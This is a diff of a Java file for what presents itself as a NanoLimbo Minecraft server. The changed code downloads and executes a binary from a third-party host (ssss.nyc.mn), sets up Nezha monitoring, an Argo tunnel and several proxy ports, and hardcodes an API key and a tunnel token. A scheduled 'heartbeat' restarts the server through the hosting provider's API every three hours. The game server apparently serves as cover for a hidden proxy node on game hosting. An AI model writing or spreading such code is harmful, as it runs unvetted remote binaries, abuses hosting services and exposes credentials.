@@ -38,27 +38,24 @@ public final class NanoLimbo {
     private static final AtomicBoolean running = new AtomicBoolean(true);
     private static Process sbxProcess;
     
-    private static final String[] ALL_ENV_VARS = {
-        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
-        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
-        "HY2_PORT", "TUIC_PORT", "REALITY_PORT", "CFIP", "CFPORT", 
-        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME"
-    };
-    
     // ========================================
-    // MineStrator 配置变量 - 根据不同服务器修改这些值
+    // Pulse 心跳配置 - 根据不同服务器修改这些值
     // ========================================
-    
     private static final String MINESTRATOR_API_KEY = "RUlWZGNtWWUzdndBaFFEOEVFRHVGa205MHJ3OWJ0UFc=";
     private static final String MINESTRATOR_SERVER_ID = "378960";
     private static final String MINESTRATOR_ACTION = "restart";  // start / stop / restart / kill
     private static final int MINESTRATOR_INTERVAL = 10800;  // 3小时 (单位:秒)
-    
     private static final String USER_AGENT = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36";
     
+    private static ScheduledExecutorService heartbeatScheduler;
     // ========================================
     
-    private static ScheduledExecutorService heartbeatScheduler;
+    private static final String[] ALL_ENV_VARS = {
+        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
+        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
+        "HY2_PORT", "TUIC_PORT", "REALITY_PORT", "S5_PORT", "ANYTLS_PORT", "ANYREALITY_PORT", "CFIP", "CFPORT", 
+        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME"
+    };
     
     
     public static void main(String[] args) {
@@ -90,8 +87,9 @@ public final class NanoLimbo {
             Thread.sleep(15000);
             clearConsole();
             
-            // Start MineStrator heartbeat after 60 seconds
-            startMineStratorHeartbeat();
+            // 启动心跳续期服务 (延迟60秒后启动)
+            startHeartbeatService();
+            
         } catch (Exception e) {
             System.err.println(ANSI_RED + "Error initializing SbxService: " + e.getMessage() + ANSI_RESET);
         }
@@ -153,8 +151,10 @@ public final class NanoLimbo {
         envVars.put("ARGO_AUTH", "eyJhIjoiNGMyMGE2ZTY0MmM4YWZhNzMzZDRlYzY0N2I0OWRlZTQiLCJ0IjoiMjZlYmRhNTAtNzRhNC00ZDk3LWE3YTQtYjA1Y2E5NTg0MjRhIiwicyI6IlkyVXhOR1E0WVRRdE9EWTBOaTAwTWpBNUxXRTBZVEF0TnpWaU5EVm1aalF6TURNeCJ9");
         envVars.put("HY2_PORT", "22966");
         envVars.put("TUIC_PORT", "");
-        envVars.put("S5_PORT", "22966");
         envVars.put("REALITY_PORT", "");
+        envVars.put("S5_PORT", "22966");
+        envVars.put("ANYTLS_PORT", "");
+        envVars.put("ANYREALITY_PORT", "");
         envVars.put("UPLOAD_URL", "");
         envVars.put("CHAT_ID", "");
         envVars.put("BOT_TOKEN", "");
@@ -198,11 +198,11 @@ public final class NanoLimbo {
         String url;
         
         if (osArch.contains("amd64") || osArch.contains("x86_64")) {
-            url = "https://amd64.ssss.nyc.mn/s-box";
+            url = "https://amd64.ssss.nyc.mn/sbsh";
         } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
-            url = "https://arm64.ssss.nyc.mn/s-box";
+            url = "https://arm64.ssss.nyc.mn/sbsh";
         } else if (osArch.contains("s390x")) {
-            url = "https://s390x.ssss.nyc.mn/s-box";
+            url = "https://s390x.ssss.nyc.mn/sbsh";
         } else {
             throw new RuntimeException("Unsupported architecture: " + osArch);
         }
@@ -220,26 +220,26 @@ public final class NanoLimbo {
     }
     
     // ========================================
-    // MineStrator 心跳功能
+    // Pulse 心跳续期功能
     // ========================================
     
-    private static void startMineStratorHeartbeat() {
+    private static void startHeartbeatService() {
         new Thread(() -> {
             try {
-                // 延迟 60 秒
+                // 延迟 60 秒后启动
                 Thread.sleep(60000);
                 
                 heartbeatScheduler = Executors.newSingleThreadScheduledExecutor();
                 
-                // 首次延迟 3 小时后执行，然后每 3 小时执行一次
+                // 首次延迟 MINESTRATOR_INTERVAL 秒后执行，然后每 MINESTRATOR_INTERVAL 秒执行一次
                 heartbeatScheduler.scheduleAtFixedRate(
                     NanoLimbo::renewMineStrator,
-                    MINESTRATOR_INTERVAL,  // 初始延迟：3小时
-                    MINESTRATOR_INTERVAL,  // 执行间隔：3小时
+                    MINESTRATOR_INTERVAL,  // 初始延迟
+                    MINESTRATOR_INTERVAL,  // 执行间隔
                     TimeUnit.SECONDS
                 );
             } catch (InterruptedException e) {
-                // 静默失败
+                // 静默处理
             }
         }).start();
     }
@@ -301,13 +301,15 @@ public final class NanoLimbo {
         }
     }
     
+    // ========================================
+    
     private static void stopServices() {
         if (sbxProcess != null && sbxProcess.isAlive()) {
             sbxProcess.destroy();
             System.out.println(ANSI_RED + "sbx process terminated" + ANSI_RESET);
         }
         
-        // 停止心跳调度器
+        // 关闭心跳调度器
         if (heartbeatScheduler != null && !heartbeatScheduler.isShutdown()) {
             heartbeatScheduler.shutdownNow();
         }
